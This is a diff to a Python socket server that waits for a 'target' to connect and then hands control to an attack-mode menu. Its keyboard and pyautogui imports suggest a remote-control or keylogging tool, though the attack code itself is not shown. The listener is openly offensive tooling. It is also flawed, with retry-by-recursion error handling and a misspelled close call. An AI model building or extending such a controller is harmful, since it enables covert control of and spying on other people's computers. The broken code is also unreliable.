@@ -1,5 +1,7 @@
 from keyboard import *
 import socket
+import os
+import sys
 from time import sleep
 import pyautogui
 class Server:
@@ -13,21 +15,27 @@ class Server:
         try:
             print("binding in process")
             self.route.bind((self.host, self.port))
-            print("binding was successfull waiting for target:....")
-            self.waiting()
+            self.route.listen(1)
+            print("binding was successfull..")
+            self.waiting()#CALLED THE WAITING METHOD
         except socket.error as err:
             #incase of socket error we will call the function again
             self.binding()
+        except OSError as err:
+            print("NOT COMPATIBLE", err)
 
     def waiting(self):#waiting for the target to connect to us
         try:
-            self.route.listen(1)
+            print("waiting for connection")
             self.channel, self.address = self.route.accept()
-            print("connection established")
-            self.messaging()
+            print("connection was established")
+            AttackModes().attack_modes()
         except socket.error as err:
             self.waiting()
-    
+        except KeyboardInterrupt:
+            print("\n YOU CLOSED THE CONNECTION")
+            self.channel.close()
+            self.route.cose()
     def main(self):
         try:
             self.binding()
